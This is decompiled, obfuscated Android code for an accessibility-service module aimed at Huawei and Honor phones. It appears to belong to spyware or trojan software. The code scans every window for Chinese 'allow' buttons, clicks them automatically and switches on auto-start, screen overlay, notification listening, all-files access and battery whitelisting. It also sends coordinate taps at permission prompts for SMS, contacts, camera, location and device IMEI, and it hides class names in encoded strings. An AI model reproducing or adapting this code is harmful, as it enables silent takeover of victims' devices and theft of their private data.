package com.storm.safe.rock.service.modules.yw5xud;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.util.StringUtil;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import kotlin.AbstractC0767a0;
import kotlin.NoWhenBranchMatchedException;
import kotlin.Pair;
import kotlin.Result;
import kotlin.collections.EmptyList;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.jvm.internal.Ref$BooleanRef;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;
import okhttp3.internal.p032ws.WebSocketProtocol;
import okio.internal.Buffer;
import org.conscrypt.FileClientSessionCache;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.C0429du;
import p000.C0530gb;
import p000.C0619ie;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.RunnableC0884n2;
import p000.RunnableC1052p1;
import p000.b81;
import p000.i40;
import p000.j40;
import p000.k40;
import p000.kg1;
import p000.kj1;
import p000.l40;
import p000.m40;
import p000.oe0;
import p000.pu0;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.yw5xud.a2 */
/* loaded from: classes2.dex */
public final class C0365a2 {

    /* renamed from: b9 */
    public static final i40 f55053b9 = new i40(null);

    /* renamed from: c0 */
    public static final String[] f55054c0;

    /* renamed from: c1 */
    public static final y90 f55055c1;

    /* renamed from: c2 */
    public static final y90 f55056c2;

    /* renamed from: c3 */
    public static final y90 f55057c3;

    /* renamed from: c4 */
    public static final y90 f55058c4;

    /* renamed from: c5 */
    public static final y90 f55059c5;

    /* renamed from: c6 */
    public static final y90 f55060c6;

    /* renamed from: c7 */
    public static final y90 f55061c7;

    /* renamed from: a0 */
    public final Context f55062a0;

    /* renamed from: a1 */
    public final AccessibilityService f55063a1;

    /* renamed from: a2 */
    public final boolean f55064a2;

    /* renamed from: a3 */
    public final String f55065a3;

    /* renamed from: a4 */
    public final y90 f55066a4;

    /* renamed from: a5 */
    public final String f55067a5;

    /* renamed from: a6 */
    public final String f55068a6;

    /* renamed from: a7 */
    public final String f55069a7;

    /* renamed from: a8 */
    public final String f55070a8;

    /* renamed from: a9 */
    public final String f55071a9;

    /* renamed from: b0 */
    public final String f55072b0;

    /* renamed from: b1 */
    public final String f55073b1;

    /* renamed from: b2 */
    public final String f55074b2;

    /* renamed from: b3 */
    public final String f55075b3;

    /* renamed from: b4 */
    public final String f55076b4;

    /* renamed from: b5 */
    public final y90 f55077b5;

    /* renamed from: b6 */
    public final y90 f55078b6;

    /* renamed from: b7 */
    public final y90 f55079b7;

    /* renamed from: b8 */
    public final y90 f55080b8;

    static {
        StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo");
        f55054c0 = new String[]{"com.huawei.hwswitchwidget.HwSwitch", "com.hihonor.widget.Switch", "com.hihonor.android.widget.Switch", "androidx.appcompat.widget.SwitchCompat", "android.widget.Switch", "android.widget.CheckBox", "android.widget.ToggleButton", "android.widget.CompoundButton"};
        f55055c1 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$Companion$PERMISSION_ALLOW_TEXTS$2
            @Override // p000.w00
            public final Object invoke() {
                return new String[]{"仅使用期间允许", "本次使用允许", "允许本次使用", "本次使用时允许", "每次都询问", "忽略", "不再提示", "不再询问", "知道了", "我知道了", "允许管理所有文件", "允许访问所有文件", "允许使用照片和视频", "允许访问照片和视频", "允许通知", "发送通知", "全部允许", "允许全部", "允许", "确定", "确认", "好", "好的", "同意", "开启", "打开", "僅使用期間允許", "本次使用允許", "允許本次使用", "本次使用時允許", "每次都詢問", "忽略", "不再提示", "不再詢問", "知道了", "我知道了", "允許管理所有檔案", "允許存取所有檔案", "允許使用相片和影片", "允許存取相片和影片", "選擇相片和影片", "允許通知", "傳送通知", "全部允許", "允許全部", "允許", "確定", "確認", "好", "好的", "同意", "開啟", "打開"};
            }
        });
        f55056c2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$Companion$AUTO_START_ENTRY_TEXTS$2
            @Override // p000.w00
            public final Object invoke() {
                return new String[]{"应用和服务", "应用与权限", "应用管理", "应用", "應用程式和服務", "應用程式與權限", "應用程式管理", "應用程式", "應用和服務", "應用管理"};
            }
        });
        f55057c3 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$Companion$AUTO_START_MANAGER_TEXTS$2
            @Override // p000.w00
            public final Object invoke() {
                return new String[]{"应用启动管理", "启动管理", "自启动管理", "权限管理", "應用程式啟動管理", "啟動管理", "自啟動管理", "權限管理"};
            }
        });
        f55058c4 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$Companion$AUTO_START_TEXTS$2
            @Override // p000.w00
            public final Object invoke() {
                return new String[]{"自启动", "自动启动", "启动管理", "自啟動", "自動啟動", "啟動管理"};
            }
        });
        f55059c5 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$Companion$AUTO_START_SWITCH_TEXTS$2
            @Override // p000.w00
            public final Object invoke() {
                return new String[]{"允许自启动", "允许关联启动", "允许后台活动", "允許自啟動", "允許關聯啟動", "允許後台活動"};
            }
        });
        f55060c6 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$Companion$OVERLAY_SWITCH_TEXTS$2
            @Override // p000.w00
            public final Object invoke() {
                return new String[]{"显示在其他应用的上层", "在其他应用上层显示", "显示在其他应用上层", "允许显示在其他应用的上层", "在其他应用的上层显示", "显示悬浮窗", "顯示在其他應用程式的上層", "在其他應用程式上層顯示", "顯示在其他應用程式上層", "允許顯示在其他應用程式的上層", "在其他應用程式的上層顯示", "顯示懸浮窗"};
            }
        });
        f55061c7 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$Companion$NOTIFICATION_ENTRY_TEXTS$2
            @Override // p000.w00
            public final Object invoke() {
                return new String[]{"通知", "通知管理", "通知权限", "通知", "通知管理", "通知權限"};
            }
        });
    }

    public C0365a2(AccessibilityService accessibilityService, Context context) {
        t60.m214695b6(context, "context");
        t60.m214695b6(accessibilityService, "service");
        this.f55062a0 = context;
        this.f55063a1 = accessibilityService;
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        boolean zEquals = lowerCase.equals("honor");
        this.f55064a2 = zEquals;
        this.f55065a3 = zEquals ? "荣耀" : "华为";
        this.f55066a4 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$flowPrefs$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                return this.f54080a0.f55062a0.getSharedPreferences("huawei_flow_status", 0);
            }
        });
        this.f55067a5 = "battery_performance_done";
        this.f55068a6 = "battery_more_settings_done";
        this.f55069a7 = "battery_network_done";
        this.f55070a8 = "battery_completed";
        this.f55071a9 = "autostart_completed";
        this.f55072b0 = "overlay_completed";
        this.f55073b1 = "notification_completed";
        this.f55074b2 = "notification_listener_completed";
        this.f55075b3 = "all_files_completed";
        this.f55076b4 = "battery_whitelist_completed";
        this.f55077b5 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$appName$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() throws PackageManager.NameNotFoundException {
                C0365a2 c0365a2 = this.f53985a0;
                try {
                    Context context2 = c0365a2.f55062a0;
                    Context context3 = c0365a2.f55062a0;
                    ApplicationInfo applicationInfo = context2.getPackageManager().getApplicationInfo(context3.getPackageName(), 0);
                    t60.m214694b5(applicationInfo, "context.packageManager.g…o(context.packageName, 0)");
                    return context3.getPackageManager().getApplicationLabel(applicationInfo).toString();
                } catch (Exception unused) {
                    String string = c0365a2.f55062a0.getString(R$string.app_name);
                    t60.m214694b5(string, "{\n            context.ge…e) // 从资源获取默认名称\n        }");
                    return string;
                }
            }
        });
        AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$isHarmonyOS$2
            @Override // p000.w00
            public final Object invoke() throws IllegalAccessException, IllegalArgumentException, InvocationTargetException {
                boolean z = false;
                try {
                    Object objInvoke = Class.forName(StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQFgdSQiVRUfVQ==")).getMethod(StringUtil.m212470a0("LFwFFV4aHi9ZNQ=="), null).invoke(null, null);
                    String str2 = objInvoke instanceof String ? (String) objInvoke : null;
                    if (str2 != null) {
                        if (str2.equalsIgnoreCase("Harmony")) {
                            z = true;
                        }
                    }
                } catch (Exception unused) {
                }
                return Boolean.valueOf(z);
            }
        });
        AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$harmonyOSVersion$2
            @Override // p000.w00
            public final Object invoke() throws IllegalAccessException, IllegalArgumentException, InvocationTargetException {
                String str2;
                double dDoubleValue = 0.0d;
                try {
                    try {
                        Double dValueOf = null;
                        Object objInvoke = Class.forName(StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQFgdSQiVRUfVQ==")).getMethod(StringUtil.m212470a0("LFwFFV4OCTxEOCRX"), null).invoke(null, null);
                        String str3 = objInvoke instanceof String ? (String) objInvoke : null;
                        if (str3 != null && (str2 = (String) AbstractC0715je.m213291h8(AbstractC0779a1.m213677d0(str3, new String[]{"."}, 6))) != null) {
                            try {
                                if (pu0.f59342a0.m213646a2(str2)) {
                                    dValueOf = Double.valueOf(Double.parseDouble(str2));
                                }
                            } catch (NumberFormatException unused) {
                            }
                            if (dValueOf != null) {
                                dDoubleValue = dValueOf.doubleValue();
                            }
                        }
                    } catch (Exception unused2) {
                        String str4 = Build.DISPLAY;
                        t60.m214694b5(str4, "DISPLAY");
                        String lowerCase2 = str4.toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        if (AbstractC0779a1.m213652a5(lowerCase2, "harmonyos 4", false)) {
                            dDoubleValue = 4.0d;
                        } else if (AbstractC0779a1.m213652a5(lowerCase2, "harmonyos 3", false)) {
                            dDoubleValue = 3.0d;
                        } else if (AbstractC0779a1.m213652a5(lowerCase2, "harmonyos 2", false)) {
                            dDoubleValue = 2.0d;
                        } else if (AbstractC0779a1.m213652a5(lowerCase2, "harmonyos", false)) {
                            dDoubleValue = 1.0d;
                        }
                    }
                } catch (Exception unused3) {
                }
                return Double.valueOf(dDoubleValue);
            }
        });
        this.f55078b6 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$screenWidth$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                int iWidth;
                Object systemService = this.f54109a0.f55062a0.getSystemService("window");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
                WindowManager windowManager = (WindowManager) systemService;
                if (Build.VERSION.SDK_INT >= 30) {
                    iWidth = windowManager.getCurrentWindowMetrics().getBounds().width();
                } else {
                    Point point = new Point();
                    windowManager.getDefaultDisplay().getRealSize(point);
                    iWidth = point.x;
                }
                return Integer.valueOf(iWidth);
            }
        });
        this.f55079b7 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$screenHeight$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                int iHeight;
                Object systemService = this.f54108a0.f55062a0.getSystemService("window");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
                WindowManager windowManager = (WindowManager) systemService;
                if (Build.VERSION.SDK_INT >= 30) {
                    iHeight = windowManager.getCurrentWindowMetrics().getBounds().height();
                } else {
                    Point point = new Point();
                    windowManager.getDefaultDisplay().getRealSize(point);
                    iHeight = point.y;
                }
                return Integer.valueOf(iHeight);
            }
        });
        this.f55080b8 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps$isFoldableDevice$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                C0365a2 c0365a2 = this.f54092a0;
                float fM212181d5 = c0365a2.m212181d5() / c0365a2.m212180d4();
                boolean z = true;
                boolean z2 = fM212181d5 >= 0.6f;
                String str2 = Build.MODEL;
                t60.m214694b5(str2, "MODEL");
                String lowerCase2 = str2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                boolean z3 = AbstractC0779a1.m213652a5(lowerCase2, "fold", false) || AbstractC0779a1.m213652a5(lowerCase2, "mate x", false) || AbstractC0779a1.m213652a5(lowerCase2, "matex", false) || AbstractC0779a1.m213652a5(lowerCase2, "pocket", false) || AbstractC0779a1.m213652a5(lowerCase2, "magic v", false) || AbstractC0779a1.m213652a5(lowerCase2, "magicv", false);
                if (!z2 && !z3) {
                    z = false;
                }
                t60.m214704c5("HuaweiSteps", "[折叠屏检测] 宽高比=" + fM212181d5 + " (>=0.6: " + z2 + "), 型号=" + lowerCase2 + " (匹配: " + z3 + ") → 折叠屏: " + z);
                return Boolean.valueOf(z);
            }
        });
    }

    /* renamed from: a4 */
    public static boolean m212142a4(C0365a2 c0365a2, String str) {
        String string;
        String string2;
        String string3;
        List<AccessibilityWindowInfo> windows = c0365a2.f55063a1.getWindows();
        if (windows == null || windows.isEmpty()) {
            t60.m214704c5("HuaweiSteps", "[clickTextInAllWindows] ❌ 没有可用窗口");
            return false;
        }
        String string4 = AbstractC0779a1.m213687e0(str).toString();
        t60.m214704c5("HuaweiSteps", "[clickTextInAllWindows] 🔍 在 " + windows.size() + " 个窗口中全屏搜索: " + string4);
        for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
            AccessibilityNodeInfo root = accessibilityWindowInfo.getRoot();
            if (root != null) {
                CharSequence title = accessibilityWindowInfo.getTitle();
                if (title == null || (string = title.toString()) == null) {
                    string = "无标题";
                }
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = root.findAccessibilityNodeInfosByText(str);
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                        if (accessibilityNodeInfo.isVisibleToUser()) {
                            Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
                            CharSequence text = accessibilityNodeInfo.getText();
                            if (text == null || (string3 = text.toString()) == null || (string2 = AbstractC0779a1.m213687e0(string3).toString()) == null) {
                                string2 = "";
                            }
                            if (string2.equals(string4)) {
                                int i = rectM24a5.left;
                                int i2 = rectM24a5.top;
                                StringBuilder sbM41c2 = AbstractC0003a2.m41c2("[clickTextInAllWindows] ✅ 在窗口[", string, "]找到: ", string4, " (位置: ");
                                sbM41c2.append(i);
                                sbM41c2.append(",");
                                sbM41c2.append(i2);
                                sbM41c2.append(")");
                                t60.m214704c5("HuaweiSteps", sbM41c2.toString());
                                if (c0365a2.m212198f5(accessibilityNodeInfo)) {
                                    t60.m214704c5("HuaweiSteps", "[clickTextInAllWindows] ✅ 点击成功: ".concat(str));
                                    return true;
                                }
                            } else {
                                continue;
                            }
                        }
                    }
                }
            }
        }
        t60.m214704c5("HuaweiSteps", "[clickTextInAllWindows] ❌ 未找到: ".concat(str));
        return false;
    }

    /* renamed from: a5 */
    public static void m212143a5(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList, ArrayList arrayList2) {
        String string;
        String string2;
        String string3;
        String string4;
        CharSequence text = accessibilityNodeInfo.getText();
        String str = "";
        if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
            string = "";
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
            str = string3;
        }
        if (string.length() > 0 && accessibilityNodeInfo.isVisibleToUser() && !arrayList.contains(string)) {
            arrayList.add(string);
        }
        if (str.length() > 0 && accessibilityNodeInfo.isVisibleToUser() && !arrayList2.contains(str)) {
            arrayList2.add(str);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212143a5(child, arrayList, arrayList2);
            }
        }
    }

    /* renamed from: a6 */
    public static void m212144a6(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        String string2;
        String string3;
        String string4;
        CharSequence text = accessibilityNodeInfo.getText();
        String str = "";
        if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
            string = "";
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
            str = string3;
        }
        if (string.length() > 0 && accessibilityNodeInfo.isVisibleToUser() && !arrayList.contains(string)) {
            arrayList.add(string);
        }
        if (str.length() > 0 && accessibilityNodeInfo.isVisibleToUser() && !arrayList.contains(str)) {
            arrayList.add("[" + str + "]");
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212144a6(child, arrayList);
            }
        }
    }

    /* renamed from: a7 */
    public static void m212145a7(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        if (accessibilityNodeInfo == null) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String string2 = (text == null || (string = text.toString()) == null) ? null : AbstractC0779a1.m213687e0(string).toString();
        if (string2 != null && string2.length() != 0) {
            arrayList.add(string2);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            m212145a7(accessibilityNodeInfo.getChild(i), arrayList);
        }
    }

    /* renamed from: c3 */
    public static AccessibilityNodeInfo m212146c3(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        AccessibilityNodeInfo accessibilityNodeInfoM212146c3;
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className != null && (string = className.toString()) != null && AbstractC0779a1.m213652a5(string, str, false)) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212146c3 = m212146c3(child, str)) != null) {
                return accessibilityNodeInfoM212146c3;
            }
        }
        return null;
    }

    /* renamed from: c4 */
    public static AccessibilityNodeInfo m212147c4(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212147c4;
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription == null || (string = contentDescription.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, str, false)) {
            return accessibilityNodeInfo;
        }
        if (AbstractC0779a1.m213652a5(str, string, false) && string.length() > 0) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212147c4 = m212147c4(child, str)) != null) {
                return accessibilityNodeInfoM212147c4;
            }
        }
        return null;
    }

    /* renamed from: c5 */
    public static AccessibilityNodeInfo m212148c5(AccessibilityNodeInfo accessibilityNodeInfo, List list) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212148c5;
        CharSequence text = accessibilityNodeInfo.getText();
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        if (string.length() > 0) {
            Iterator it = list.iterator();
            while (it.hasNext()) {
                if (new Regex((String) it.next()).f57628a0.matcher(string).find()) {
                    return accessibilityNodeInfo;
                }
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212148c5 = m212148c5(child, list)) != null) {
                return accessibilityNodeInfoM212148c5;
            }
        }
        return null;
    }

    /* renamed from: c6 */
    public static AccessibilityNodeInfo m212149c6(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM212149c6;
        if (accessibilityNodeInfo.isScrollable()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212149c6 = m212149c6(child)) != null) {
                return accessibilityNodeInfoM212149c6;
            }
        }
        return null;
    }

    /* renamed from: c9 */
    public static AccessibilityNodeInfo m212150c9(C0365a2 c0365a2, AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        boolean z;
        String string3;
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        if (parent == null) {
            return null;
        }
        CharSequence className = parent.getClassName();
        t60.m214704c5("HuaweiSteps", "[findSwitchInSiblings] 父节点: " + ((Object) className) + ", 子节点数: " + parent.getChildCount());
        int childCount = parent.getChildCount();
        boolean z2 = false;
        int i = 0;
        while (i < childCount) {
            AccessibilityNodeInfo child = parent.getChild(i);
            if (child != null) {
                CharSequence className2 = child.getClassName();
                if (className2 == null || (string = className2.toString()) == null) {
                    string = "";
                }
                if (child.isEnabled() && string.equals("android.widget.Switch")) {
                    t60.m214704c5("HuaweiSteps", "[findSwitchInSiblings] ✅ 找到开关(精确): ".concat(string));
                    return child;
                }
                if (child.isEnabled() && (AbstractC0779a1.m213652a5(string, "Switch", z2) || AbstractC0779a1.m213652a5(string, "Toggle", z2) || AbstractC0779a1.m213652a5(string, "CheckBox", z2))) {
                    t60.m214704c5("HuaweiSteps", "[findSwitchInSiblings] ✅ 找到开关(包含): ".concat(string));
                    return child;
                }
                if (child.isCheckable() && child.isEnabled()) {
                    t60.m214704c5("HuaweiSteps", "[findSwitchInSiblings] ✅ 找到开关(isCheckable): ".concat(string));
                    return child;
                }
                int childCount2 = child.getChildCount();
                int i2 = z2 ? 1 : 0;
                while (i2 < childCount2) {
                    AccessibilityNodeInfo child2 = child.getChild(i2);
                    if (child2 != null) {
                        CharSequence className3 = child2.getClassName();
                        if (className3 == null || (string2 = className3.toString()) == null) {
                            string2 = "";
                        }
                        if (child2.isEnabled() && (string2.equals("android.widget.Switch") || AbstractC0779a1.m213652a5(string2, "Switch", z2) || AbstractC0779a1.m213652a5(string2, "Toggle", z2) || AbstractC0779a1.m213652a5(string2, "CheckBox", z2))) {
                            t60.m214704c5("HuaweiSteps", "[findSwitchInSiblings] ✅ 找到开关(子节点): ".concat(string2));
                            return child2;
                        }
                        if (child2.isCheckable() && child2.isEnabled()) {
                            t60.m214704c5("HuaweiSteps", "[findSwitchInSiblings] ✅ 找到开关(子节点isCheckable): ".concat(string2));
                            return child2;
                        }
                        int childCount3 = child2.getChildCount();
                        int i3 = z2 ? 1 : 0;
                        while (i3 < childCount3) {
                            AccessibilityNodeInfo child3 = child2.getChild(i3);
                            if (child3 == null) {
                                accessibilityNodeInfo2 = parent;
                                z = z2 ? 1 : 0;
                            } else {
                                CharSequence className4 = child3.getClassName();
                                String str = (className4 == null || (string3 = className4.toString()) == null) ? "" : string3;
                                if (child3.isEnabled()) {
                                    if (!str.equals("android.widget.Switch")) {
                                        accessibilityNodeInfo2 = parent;
                                        z = false;
                                        if (AbstractC0779a1.m213652a5(str, "Switch", false) || AbstractC0779a1.m213652a5(str, "Toggle", false) || AbstractC0779a1.m213652a5(str, "CheckBox", false)) {
                                        }
                                    }
                                    t60.m214704c5("HuaweiSteps", "[findSwitchInSiblings] ✅ 找到开关(孙节点): ".concat(str));
                                    return child3;
                                }
                                accessibilityNodeInfo2 = parent;
                                z = false;
                                if (child3.isCheckable() && child3.isEnabled()) {
                                    t60.m214704c5("HuaweiSteps", "[findSwitchInSiblings] ✅ 找到开关(孙节点isCheckable): ".concat(str));
                                    return child3;
                                }
                            }
                            i3++;
                            z2 = z;
                            parent = accessibilityNodeInfo2;
                        }
                    }
                    i2++;
                    z2 = z2;
                    parent = parent;
                }
            }
            i++;
            z2 = z2;
            parent = parent;
        }
        return null;
    }

    /* renamed from: d0 */
    public static void m212151d0(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "Toggle", false)) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212151d0(child, arrayList);
            }
        }
    }

    /* renamed from: d3 */
    public static j40 m212152d3(String str) {
        return (AbstractC0779a1.m213652a5(str, "拍摄", false) || AbstractC0779a1.m213652a5(str, "相机", false) || AbstractC0779a1.m213652a5(str, "录制视频", false) || AbstractC0779a1.m213652a5(str, "Camera", true)) ? new j40(0.65f, 0.77f, 0.65f, 0.795f, "📷相机") : (AbstractC0779a1.m213652a5(str, "照片", false) || AbstractC0779a1.m213652a5(str, "图片", false) || AbstractC0779a1.m213652a5(str, "视频", false) || AbstractC0779a1.m213652a5(str, "相册", false) || AbstractC0779a1.m213652a5(str, "媒体", false) || AbstractC0779a1.m213652a5(str, "Photo", true) || AbstractC0779a1.m213652a5(str, "Video", true) || AbstractC0779a1.m213652a5(str, "Media", true)) ? new j40(0.65f, 0.845f, 0.65f, 0.815f, "🖼️相册") : (AbstractC0779a1.m213652a5(str, "录制音频", false) || AbstractC0779a1.m213652a5(str, "录音", false) || AbstractC0779a1.m213652a5(str, "麦克风", false) || AbstractC0779a1.m213652a5(str, "音频", false) || AbstractC0779a1.m213652a5(str, "Microphone", true) || AbstractC0779a1.m213652a5(str, "Record audio", true)) ? new j40(0.65f, 0.77f, 0.65f, 0.795f, "🎤麦克风") : (AbstractC0779a1.m213652a5(str, "短信", false) || AbstractC0779a1.m213652a5(str, "信息", false) || AbstractC0779a1.m213652a5(str, "SMS", true) || AbstractC0779a1.m213652a5(str, "Message", true)) ? new j40(0.75f, 0.88f, 0.75f, 0.9f, "📱短信") : (AbstractC0779a1.m213652a5(str, "电话", false) || AbstractC0779a1.m213652a5(str, "通话", false) || AbstractC0779a1.m213652a5(str, "拨打", false) || AbstractC0779a1.m213652a5(str, "Phone", true) || AbstractC0779a1.m213652a5(str, "Call", true)) ? new j40(0.75f, 0.88f, 0.75f, 0.9f, "📞电话") : (AbstractC0779a1.m213652a5(str, "通讯录", false) || AbstractC0779a1.m213652a5(str, "联系人", false) || AbstractC0779a1.m213652a5(str, "Contacts", true)) ? new j40(0.75f, 0.88f, 0.75f, 0.9f, "👥通讯录") : (AbstractC0779a1.m213652a5(str, "位置", false) || AbstractC0779a1.m213652a5(str, "定位", false) || AbstractC0779a1.m213652a5(str, "Location", true)) ? new j40(0.65f, 0.77f, 0.65f, 0.795f, "📍位置") : (AbstractC0779a1.m213652a5(str, "存储", false) || AbstractC0779a1.m213652a5(str, "文件", false) || AbstractC0779a1.m213652a5(str, "Storage", true) || AbstractC0779a1.m213652a5(str, "File", true)) ? new j40(0.65f, 0.77f, 0.65f, 0.795f, "📁存储") : AbstractC0779a1.m213652a5(str, "日历", false) ? new j40(0.75f, 0.88f, 0.75f, 0.9f, "📅日历") : (AbstractC0779a1.m213652a5(str, "通知", false) || AbstractC0779a1.m213652a5(str, "Notification", true)) ? new j40(0.65f, 0.77f, 0.65f, 0.795f, "🔔通知") : (AbstractC0779a1.m213652a5(str, "设备", false) || AbstractC0779a1.m213652a5(str, "IMEI", false)) ? new j40(0.75f, 0.88f, 0.75f, 0.9f, "📲设备") : new j40(0.75f, 0.88f, 0.75f, 0.9f, "🔧默认");
    }

